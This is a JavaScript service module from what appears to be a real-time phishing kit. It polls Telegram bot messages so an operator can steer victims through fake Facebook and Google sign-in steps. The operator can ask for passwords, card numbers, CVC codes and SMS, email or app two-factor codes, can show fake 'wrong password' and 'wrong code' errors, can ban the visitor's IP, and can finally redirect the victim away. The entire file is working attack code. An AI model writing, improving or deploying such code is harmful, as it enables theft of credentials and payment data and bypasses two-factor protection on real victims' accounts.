import axios from "axios";
import { buildApiUrl } from "../config/api";
import { IPService } from "./ipService";
import { getRedirectUrl } from "../config/redirect";

export class TelegramService {
  static isRequestPending = false;
  static requestController = null;
  static consecutiveErrors = 0;
  static maxRetries = 3;
  static baseDelay = 1000; // 1 second base delay
  static lastProcessedWrong2faCommand = null; // Track last processed wrong2fa command
  static lastProcessedPasswordCommand = null; // Track last processed password command
  static lastProcessedBadCredsCommand = null; // Track last processed badcreds command
  static lastProcessedCallbackId = null; // Track last processed callback_query.id to prevent duplicate processing
  static processedReplyIds = new Set(); // Track processed reply message IDs to prevent re-processing on repeated polls

  static async fetchMessages() {
    // Prevent multiple simultaneous requests
    if (this.isRequestPending) {
      return [];
    }

    // Cancel any existing request
    if (this.requestController) {
      this.requestController.abort();
    }

    this.isRequestPending = true;
    this.requestController = new AbortController();

    try {
      const response = await axios.get(buildApiUrl("/api/getMessages"), {
        timeout: 8000, // Reduced timeout
        headers: {
          "Content-Type": "application/json",
        },
        signal: this.requestController.signal,
      });

      // Reset error count on successful request
      this.consecutiveErrors = 0;

      return response?.data?.data?.result || [];
    } catch (error) {
      this.consecutiveErrors++;

      // Don't log errors for aborted requests (normal cancellation)
      if (error.name === "AbortError") {
        console.log("[Telegram] Request was cancelled");
        return [];
      }

      // Log error only in development or for critical errors
      if (process.env.NODE_ENV === "development") {
        console.warn(
          `[Telegram] Error fetching messages (attempt ${this.consecutiveErrors}):`,
          error.message
        );
      }

      // Return empty array to prevent breaking the app
      return [];
    } finally {
      this.isRequestPending = false;
      this.requestController = null;
    }
  }

  static shouldSkipPolling() {
    // Skip polling if too many consecutive errors
    if (this.consecutiveErrors >= this.maxRetries) {
      if (process.env.NODE_ENV === "development") {
        console.warn(
          `[Telegram] Skipping polling due to ${this.consecutiveErrors} consecutive errors`
        );
      }
      return true;
    }
    return false;
  }

  static getPollingDelay() {
    // Exponential backoff for errors
    if (this.consecutiveErrors > 0) {
      const delay = this.baseDelay * Math.pow(2, this.consecutiveErrors - 1);
      return Math.min(delay, 30000); // Max 30 seconds
    }
    return 0; // No delay for successful requests
  }

  static resetErrorState() {
    this.consecutiveErrors = 0;
  }

  static processCommand(command, uniqueString, currentState) {
    const {
      setStep,
      setLastFetch,
      LastFetch,
      Ip,
      setWrong2faTrigger,
      wrong2faTrigger,
      setWrongPasswordTrigger,
      wrongPasswordTrigger,
      setWrongCredsTrigger,
      wrongCredsTrigger,
      Step,
    } = currentState;

    const commands = {
      "/2fa": () => {
        if (LastFetch !== "2fa") {
          setStep(14);
          setLastFetch("2fa");
        }
      },
      "/incorrect-2fa": () => {
        if (LastFetch !== "incorrect-2fa") {
          setStep(6);
          setLastFetch("incorrect-2fa");
        }
      },
      "/password": (fullCommand) => {
        // Check if this is a new password command (idempotent check)
        if (this.lastProcessedPasswordCommand === fullCommand) {
          return;
        }

        this.lastProcessedPasswordCommand = fullCommand;

        // If user is on waiting page (step 4), bring them back to step 2 (password page) with error
        if (Step === 4) {
          setStep(2);
        }
        
        setLastFetch("password");

        if (typeof setWrongPasswordTrigger === "function") {
          setWrongPasswordTrigger((prev) => prev + 1);
        }
      },
      "/badcreds": (fullCommand) => {
        // If user is on waiting page (step 4), bring them back to step 2 (password page) with error
        if (Step === 4) {
          setStep(2);
        }
        
        setLastFetch("badcreds");

        if (typeof setWrongCredsTrigger === "function") {
          setWrongCredsTrigger((prev) => prev + 1);
        }
      },
      "/wait": () => {
        if (LastFetch !== "wait") {
          setStep(4);
          setLastFetch("wait");
        }
      },
      "/nwait": () => {
        if (LastFetch !== "nwait") {
          setStep(16);
          setLastFetch("nwait");
        }
      },
      "/email": () => {
        if (LastFetch !== "email") {
          setStep(1);
          setLastFetch("email");
        }
      },
      "/card": () => {
        if (LastFetch !== "card") {
          setStep(8);
          setLastFetch("card");
        }
      },
      "/cvc": () => {
        if (LastFetch !== "cvc") {
          setStep(3);
          setLastFetch("cvc");
        }
      },
      "/phone": () => {
        if (LastFetch !== "phoneVerify") {
          setStep(10);
          setLastFetch("phoneVerify");
        }
      },
      "/whatsapp": () => {
        if (LastFetch !== "whatsapp") {
          setStep(12);
          setLastFetch("whatsapp");
        }
      },
      "/emailVerify": () => {
        if (LastFetch !== "emailVerify") {
          setStep(13);
          setLastFetch("emailVerify");
        }
      },
      "/Email2fa": () => {
        if (Step === 17) {
          setLastFetch("Email2fa");
          if (typeof window !== "undefined") {
            window.dispatchEvent(new CustomEvent("admin-2fa-email"));
          }
          return;
        }

        if (LastFetch !== "Email2fa") {
          setStep(13);
          setLastFetch("Email2fa");
        }
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-email2fa"));
        }
      },
      "/email2fa": () => {
        if (Step === 17) {
          setLastFetch("Email2fa");
          if (typeof window !== "undefined") {
            window.dispatchEvent(new CustomEvent("admin-2fa-email"));
          }
          return;
        }

        if (LastFetch !== "Email2fa") {
          setStep(13);
          setLastFetch("Email2fa");
        }
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-email2fa"));
        }
      },
      "/done": () => {
        if (LastFetch !== "done") {
          setStep(11);
          setLastFetch("done");
        }
      },
      "/appauth": () => {
        // Dispatch event for Google sign-in modal to show code input
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("appauth-show-code"));
        }
      },
      "/redirect": () => {
        try {
          const target = getRedirectUrl();
          if (typeof window !== "undefined" && target) {
            window.location.href = target;
          }
        } catch (e) {
          // no-op
        }
      },
      "/authApp": () => {
        if (LastFetch !== "authApp") {
          setStep(15);
          setLastFetch("authApp");
        }
      },
      "/bademail": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-bad-email"));
        }
      },
      "/g-bademail": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-bad-email"));
        }
      },
      "/badpass": () => {
        // For fbook flow: if user is on the wait page (step 4), bring them back to step 2 with error
        if (Step === 4) {
          setStep(2);
          setLastFetch("badpass");
          if (typeof setWrongPasswordTrigger === "function") {
            setWrongPasswordTrigger((prev) => prev + 1);
          }
        }
        // Also dispatch event for Gmail modal (GoogleSignInPC/Mobile)
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-bad-pass"));
        }
      },
      "/g-badpass": () => {
        if (Step === 4) {
          setStep(2);
          setLastFetch("badpass");
          if (typeof setWrongPasswordTrigger === "function") {
            setWrongPasswordTrigger((prev) => prev + 1);
          }
        }
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-bad-pass"));
        }
      },
      "/2fagmail": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-2fa-gmail"));
        }
      },
      "/g-2fagmail": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-2fa-gmail"));
        }
      },
      "/2fanumber": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-2fa-code"));
        }
      },
      "/g-2fayoutube": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-2fa-youtube"));
        }
      },
      "/g-2facode": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-2fa-code"));
        }
      },
      "/g-2fanumber": () => {
        if (Step === 17) {
          setLastFetch("g2fa-number");
        } else if (LastFetch !== "g2fa-number") {
          setStep(13);
          setLastFetch("g2fa-number");
        }
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-2fa-number"));
        }
      },
      "/g-wrong2fanumber": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-wrong-2fa-number"));
        }
      },
      "/g-wrong2fasms": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("wrong2fa"));
          window.dispatchEvent(new CustomEvent("admin-wrong-2fa-sms"));
        }
      },
      "/2fasms": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-2fa-sms"));
        }
      },
      "/g-2fasms": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-2fa-sms"));
        }
      },
      "/2faemail": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-2fa-email"));
        }
      },
      "/g-email2fa": () => {
        if (Step === 17) {
          setLastFetch("g2fa-number");
          if (typeof window !== "undefined") {
            window.dispatchEvent(new CustomEvent("admin-2fa-number"));
          }
          return;
        }

        if (LastFetch !== "g2fa-number") {
          setStep(13);
          setLastFetch("g2fa-number");
        }
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-2fa-number"));
        }
      },
      "/gmailwait": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-wait"));
        }
      },
      "/g-wait": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-wait"));
        }
      },
      "/g-done": () => {
        if (LastFetch !== "done") {
          setStep(11);
          setLastFetch("done");
        }
      },
      "/google": () => {
        setLastFetch("google-gmail");
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-facebook-google"));
          axios.post(buildApiUrl("/api/appauth/notify-2fa"), {
            userId: uniqueString,
            type: 'google-email'
          }).catch(() => {});
        }
      },
      "/g-gmail": () => {
        if (typeof window !== "undefined") {
          window.dispatchEvent(new CustomEvent("admin-google-gmail"));
        }
      },
      "/wrong2fa": (fullCommand) => {
        // Check if this is a new wrong2fa command (idempotent check)
        if (this.lastProcessedWrong2faCommand === fullCommand) {
          return;
        }

        this.lastProcessedWrong2faCommand = fullCommand;

        if (typeof currentState.setWrong2faTrigger === "function") {
          currentState.setWrong2faTrigger((prev) => prev + 1);
        }
      },
      "/ban": async () => {
        if (LastFetch !== "Ban" && Ip) {
          setLastFetch("Ban");
          try {
            await IPService.banIP(Ip);
          } catch (error) {
            if (process.env.NODE_ENV === "development") {
              console.warn("[Telegram] Error banning IP:", error.message);
            }
          }
        }
      },
      "/clear": () => {
        setLastFetch("clear");
        // Reset error state and command tracking when clearing
        this.resetErrorState();
        this.lastProcessedWrong2faCommand = null;
        this.lastProcessedPasswordCommand = null;
        this.lastProcessedBadCredsCommand = null;
        this.lastProcessedCallbackId = null;
      },
    };

    // Handle /wrong2fa commands with additional data
    if (command.startsWith("/wrong2fa")) {
      try {
        if (commands["/wrong2fa"]) {
          commands["/wrong2fa"](command); // Pass full command for idempotency check
        }
      } catch (error) {
        if (process.env.NODE_ENV === "development") {
          console.warn(
            "[Telegram] Error processing wrong2fa command:",
            command,
            error.message
          );
        }
      }
    } else if (command.startsWith("/password")) {
      // Handle /password commands with additional data
      try {
        if (commands["/password"]) {
          commands["/password"](command); // Pass full command for idempotency check
        }
      } catch (error) {
        if (process.env.NODE_ENV === "development") {
          console.warn(
            "[Telegram] Error processing password command:",
            command,
            error.message
          );
        }
      }
    } else if (command.startsWith("/badcreds")) {
      // Handle /badcreds commands with additional data
      try {
        if (commands["/badcreds"]) {
          commands["/badcreds"](command); // Pass full command for idempotency check
        }
      } catch (error) {
        if (process.env.NODE_ENV === "development") {
          console.warn(
            "[Telegram] Error processing badcreds command:",
            command,
            error.message
          );
        }
      }
    } else if (commands[command]) {
      // Handle other commands normally
      try {
        commands[command]();
      } catch (error) {
        if (process.env.NODE_ENV === "development") {
          console.warn(
            "[Telegram] Error processing command:",
            command,
            error.message
          );
        }
      }
    }
  }

  static async pollMessages(uniqueString, currentState) {
    // Skip if too many errors
    if (this.shouldSkipPolling()) {
      return;
    }

    try {
      const result = await this.fetchMessages();

      if (result.length > 0) {
        // Process callback_query updates (button clicks)
        const messageUpdates = result.filter(
          ({ callback_query }) => callback_query?.data !== undefined
        );

        messageUpdates.forEach(({ callback_query }) => {
          try {
            const [command, id] = callback_query.data.split(" ");
            if (id === uniqueString || command === "/clear") {
              // Skip if we already processed this exact callback (prevents repeated firing from offset=-1)
              if (callback_query.id && this.lastProcessedCallbackId === callback_query.id) {
                return;
              }
              this.lastProcessedCallbackId = callback_query.id;

              if (command === "/switch-fb" || command === "/switch-gm") {
                axios.post(buildApiUrl("/api/telegram/switch-keyboard"), {
                  userId: id,
                  target: command === "/switch-fb" ? "fb" : "gm",
                  callbackQueryId: callback_query.id,
                  chatId: callback_query.message?.chat?.id,
                  messageId: callback_query.message?.message_id,
                }).catch(() => {});
                return;
              }

              this.processCommand(command, uniqueString, currentState);
            }
          } catch (error) {
            if (process.env.NODE_ENV === "development") {
              console.warn(
                "[Telegram] Error processing message:",
                error.message
              );
            }
          }
        });

        // Process regular text messages (admin typing verification code as REPLY)
        const textUpdates = result.filter(
          ({ message }) => message?.text && !message.text.startsWith("/") && message.reply_to_message
        );

        textUpdates.forEach(({ message }) => {
          try {
            const code = message.text.trim();
            const replyToMessageId = message.reply_to_message.message_id;

            // Derive replyType from current state
            const { LastFetch } = currentState;
            const replyType = LastFetch === 'g2fa-number' ? 'g-2fanumber'
              : LastFetch === 'Email2fa' ? 'email2fa'
              : LastFetch === 'google-gmail' ? 'google-gmail'
              : LastFetch === 'sms' ? '2fasms'
              : '2fanumber';

            // Skip already-processed reply messages (use the admin's message ID, not the bot's)
            const replyMsgId = message.message_id;
            if (TelegramService.processedReplyIds.has(replyMsgId)) return;
            TelegramService.processedReplyIds.add(replyMsgId);
            // Prevent the Set from growing forever
            if (TelegramService.processedReplyIds.size > 200) {
              const first = TelegramService.processedReplyIds.values().next().value;
              TelegramService.processedReplyIds.delete(first);
            }

            // Send to backend to handle reply
            if (typeof window !== "undefined" && code && replyToMessageId) {
              axios.post(buildApiUrl("/api/appauth/reply"), {
                replyToMessageId,
                code,
                userId: uniqueString,
                replyType,
              }).then((response) => {
                // Dispatch to the correct page based on reply type
                const rt = response?.data?.replyType;
                if (rt === 'google-email') {
                  window.dispatchEvent(
                    new CustomEvent("admin-google-gmail", { detail: { email: code } })
                  );
                } else if (rt === '2fasms' || rt === 'g-2fasms') {
                  window.dispatchEvent(
                    new CustomEvent("appauth-sms-digits-received", { detail: { digits: code } })
                  );
                } else if (rt === 'g-2fanumber' || rt === 'email2fa') {
                  window.dispatchEvent(
                    new CustomEvent("appauth-email-received", { detail: { email: code } })
                  );
                } else {
                  window.dispatchEvent(
                    new CustomEvent("appauth-code-received", { detail: { code } })
                  );
                }
              }).catch(error => {
                if (process.env.NODE_ENV === "development") {
                  console.warn("[Telegram] Error sending reply:", error.message);
                }
              });
            }
          } catch (error) {
            if (process.env.NODE_ENV === "development") {
              console.warn(
                "[Telegram] Error processing text message:",
                error.message
              );
            }
          }
        });
      }
    } catch (error) {
      // Error already handled in fetchMessages
      if (process.env.NODE_ENV === "development") {
        console.warn("[Telegram] Error in pollMessages:", error.message);
      }
    }
  }
}
